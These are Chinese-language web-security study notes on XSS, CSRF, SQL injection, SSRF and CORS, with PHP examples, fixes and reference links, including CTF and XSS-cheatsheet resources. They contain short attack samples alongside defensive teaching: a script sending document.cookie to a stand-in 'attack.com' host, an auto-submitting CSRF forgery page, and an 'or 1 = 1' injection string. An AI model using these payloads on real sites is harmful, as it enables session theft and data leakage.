# 網頁安全

## RFC9116

- [あなたのWebサービスの脆弱性を発見者から教えてもらう方法 - RFC9116が発表されました](https://zenn.dev/sh1ma/articles/20e61d84e7d380)

## XSS

- Cross-site scripting（跨網站指令碼）
- 利用網頁上會動態產生內容部份（ex. 輸入欄位）的漏洞，注入惡意腳本的攻擊手法
- 例如使用短網址包覆帶有惡意腳本的網址：
  `http://app.com/?name=?<script>...attack.com/bad.php?data=document.cookie;</script>`
- 攻擊者便可取得使用者的 Cookie，並藉此盜用相關資料
- 可以針對特殊文字進行處理（例如 `<`、`&`）防止攻擊

### 範例

```php
<!-- 搜尋表格 search.php -->
<form action="result.php">
  <input type="text" name="keyword" />
  <button type="submit">搜尋</button>
</form>

<!-- 搜尋結果頁面 result.php -->
<h2><?php echo $_GET['keyword']; ?>的搜尋結果</h2>

// 輸入 <script>location.href = 'http://example.com'</script>
// 結果頁面會變為
<h2>
  <script>
    location.href = "http://example.com";
  </script>
  的搜尋結果
</h2>

// 對策：加入 escape
<h2><?php echo htmlspecialchars($_GET['keyword'], ENT_QUOTES); ?>的搜尋結果</h2>
```

## CSRF

- Cross-site request forgery（跨站請求偽造）
- 利用網頁應用處理程序上的漏洞，進行原定以外處理的攻擊手法
- 例如使用短網指包覆指定行為的網址：`http://app.com/post/`
- 導致使用者身份被盜用，從而進行非原定的行為，例如留下犯罪宣言的訊息
- 可以在 request 裡加入 token 驗證這個行為是否真的來自該使用者
- [これで完璧！今さら振り返る CSRF 対策と同一オリジンポリシーの基礎](https://qiita.com/mpyw/items/0595f07736cfa5b1f50c)

### 範例

```php
<!-- 搜尋表格 input.php -->
<form action="post.php" method="post">
  <label>Title</label>
  <input type="text" name="title">
  <label>Content</label>
  <textarea name="content"></textarea>
  <button type="submit">Submit</button>
</form>

<!-- 儲存處理 post.php -->
$title = $_POST['title'] ?? null;
$content = $_POST['content'] ?? null;

// 檢查輸入
if (!$title || !$content) {
  throw new Exception('invalid input');
}

// 儲存至資料庫
$pdo->prepare('insert into posts(title, content) values (:title, :content)');
$pdo->execute([
  ':title' => $title,
  ':content' => $content,
]);

// 另一個含有攻擊程式碼的網站 index.html
<iframe src="forgery.html" width="1" height"1">
// iframe 內容 forgery.html
<body onload="document.forgery.submit()">
<form name="forgery" action="http://sample.com/post.php" method="post">
  <input type="hidden" name="title" value="Dangerous Title">
  <input type="hidden" name="content" value="Dangerous Content">
</form>
</body>

// 受害者點進此含有攻擊程式碼的網站後
// 就會在不知不覺中以自己的 IP 地址和 UserAgent 傳送出有危險性的內容（e.g. 犯罪宣言）

// 對策：加入 token 驗證
// input.php
<?php
session_start();

$token = bin2hex(openssl_random_pseudo_bytes(16));
$_SESSION['token'] = $token;
?>
<form action="post.php" method="post">
  <input type="hidden" name="token" value="<?php echo $token; ?>">
  <label>Title</label>
  <input type="text" name="title">
  <label>Content</label>
  <textarea name="content"></textarea>
  <button type="submit">Submit</button>
</form>

// post.php
<?php
session_start();

if (
  empty($_POST['token'])
    || empty($_SESSION['token'])
    || $_POST['token'] !== $_SESSION['token']
) {
  throw new Exception('token mismatched')
}
?>
// ...
```

## XSS 和 CSRF 的差異

| 觀點     | XSS                           | CSRF                       |
| -------- | ----------------------------- | -------------------------- |
| 漏洞     | 網頁應用程式                  | 網頁應用程式               |
| 執行機制 | 造訪有問題的網址              | 造訪有問題的網址           |
| 執行源頭 | 網頁瀏覽器（Client）          | 網頁伺服器（Server）       |
| 執行內容 | JavaScript 所能執行的任意內容 | 網頁應用程式內所定義的處理 |
| 執行前提 | 無                            | 受害者需先登入網頁應用程式 |

## SQL Injection

### 範例

```php
$status = $_GET['status'];

$sql = "select * from orders where status = {$status} and user = {$self}";
$stmt = $pdo->query($sql);

$data = [];
while ( $row = $stmt->fetch(PDO::FETCH_ASSOC) ) {
  $data[] = $row;
}

// 如果 $_GET['status'] 傳入 1 or 1 = 1; select * from orders where 1 = 1
// 所執行的 SQL 就會變成 select * from orders where stasus = 1 or 1 = 1; select * from orders where 1 = 1 and user = 123
// 就會導致所有資料流出

// 對策：改為參數化查詢，escape 文字內容
$status = $_GET['status'];

$sql = "select * from orders where status = :status and user = :user";
$stmt = $pdo->prepare($sql);
$stmt->execute([
  ':status' => $status,
  ':user' => $self,
]);

$data = [];
while ( $row = $stmt->fetch(PDO::FETCH_ASSOC) ) {
  $data[] = $row;
}
```

## ClickJacking

## Open Redirect

## DOS

## Insecure Direct Object Reference Vulnerability

## JSON Hijacking

- [Json Hijacking 簡介 « 關於網路那些事...](https://adon988.logdown.com/posts/7820118-introduction-to-json-hijacking)

## SSRF

- Server-side request forgery
- 利用公開網路與內部網路溝通的漏洞，進行繞過權限認證的攻擊方式

## [同源政策（Same-Origin Policy）](https://developer.mozilla.org/zh-TW/docs/Web/Security/Same-origin_policy)

### 什麼是 CORS（Cross-Origin Resource Sharing，跨來源資源共用）？

### 解決方案

#### 從 API 後端開放權限

#### CORS-anywhere

```javascript
// use cors-anywhere to fetch api data
const cors = "https://cors-anywhere.herokuapp.com/";
// origin api url
const url = "https://tw.rter.info/capi.php?=1568944322585";

// fetch api url by cors-anywhere
axios.get(`${cors}${url}`).then(
  (response) => {
    const msg = response.data;
    document.body.innerHTML = JSON.stringify(msg);
  },
  (error) => {}
);
```

### 參考文章

- [\[教學\] CORS 是什麼? 如何設定 CORS?](https://shubo.io/what-is-cors/)
- [輕鬆理解 Ajax 與跨來源請求](https://blog.techbridge.cc/2017/05/20/api-ajax-cors-and-jsonp/)
- [原來 CORS 沒有我想像中的簡單](https://blog.techbridge.cc/2018/08/18/cors-issue/)
- [和 CORS 跟 cookie 打交道](https://medium.com/d-d-mag/%E5%92%8C-cors-%E8%B7%9F-cookie-%E6%89%93%E4%BA%A4%E9%81%93-dd420ccc7399)
- [新的取消請求方式 - AbortController](https://blog.kalan.dev/abort-controller/)
- [这波跨域不亏](https://github.com/xixigiggling/my-ice-cream/issues/9)

## 相關文章

- [安全な Web サイトのつくりかた　ざっくりまとめ part1](https://qiita.com/E-46/items/93199f38bdacd6b6076a)
- [安全な Web サイトのつくりかた　ざっくりまとめ part2](https://qiita.com/E-46/items/aa43b6a01de8ab205591)
- [個人開発でも最低限やっておくべきインフラレベルでのセキュリティ対策](https://qiita.com/uichi/items/c34536b66101e9440cf2)
- [Web セキュリティ覚書 : "HTTPS" 編 [ 初学者向け ]](https://qiita.com/Tsutou/items/cea87dbab0f3d0080422)
- [Web セキュリティ覚書 : "攻撃" 編 [ 初学者向け ]](https://qiita.com/Tsutou/items/4fd498f8ab2638bd5650)
- [Same Origin Policy 同源政策 ! 一切安全的基礎](https://medium.com/@jaydenlin/same-origin-policy-%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96-%E4%B8%80%E5%88%87%E5%AE%89%E5%85%A8%E7%9A%84%E5%9F%BA%E7%A4%8E-36432565a226)
- [3 分でわかる XSS と CSRF の違い](https://qiita.com/wanko5296/items/142b5b82485b0196a2da)
- [SSRF 基礎 - Speaker Deck](https://speakerdeck.com/hasegawayosuke/ssrfji-chu)
- [URL の取り扱いには要注意！ SSRF の攻撃と対策](https://yamory.io/blog/about-ssrf/)
- [ktecv2000/How-to-play-CTF: CTF 入門建議](https://github.com/ktecv2000/How-to-play-CTF)
- [Cheatsheet: XSS that works in 2021 - Sam's Hacking Wonderland](https://netsec.expert/posts/xss-in-2021/#v3)
- [XSS Challenge](https://xss.challenge.training.hacq.me/)
- [淺談 XSS 攻擊與防禦的各個環節](https://blog.huli.tw/categories/Security/archives/2/)
- [Hack The Box を楽しむための Kali Linux チューニング](https://qiita.com/v_avenger/items/c85d946ed2b6bf340a84)
- [Learn Cybersecurity for Hackers, Students & - Chef Secure](https://chefsecure.com/)
- [XSS Game - Learning XSS Made Simple!](https://xss.pwnfunction.com/)
- [Web 開発者はもっと「安全なウェブサイトの作り方」を読むべき](https://blog.flatt.tech/entry/anzenna_website_no_tsukurikata)
- [【2020 年】CTF Web 問題の攻撃手法まとめ](https://graneed.hatenablog.com/entry/2021/08/09/115452)
- [【CTF】OSINT 問題で個人的に使用するツール・サイト・テクニックまとめ](https://qiita.com/xryuseix/items/e35b8c946e5dfe96f848)
- [IT 邦幫忙鐵人賽懶人包 2020 原來鄰居的 wifi 密碼那麼容易取得](https://medium.com/starbugs/it%E9%82%A6%E5%B9%AB%E5%BF%99%E9%90%B5%E4%BA%BA%E8%B3%BD%E6%87%B6%E4%BA%BA%E5%8C%85-2020-%E5%8E%9F%E4%BE%86%E9%84%B0%E5%B1%85%E7%9A%84-wifi-%E5%AF%86%E7%A2%BC%E9%82%A3%E9%BA%BC%E5%AE%B9%E6%98%93%E5%8F%96%E5%BE%97-7e17edc0ea27)
- [暗号技術勉強メモ](https://qiita.com/opengl-8080/items/85df520e2d8c4e19be8e)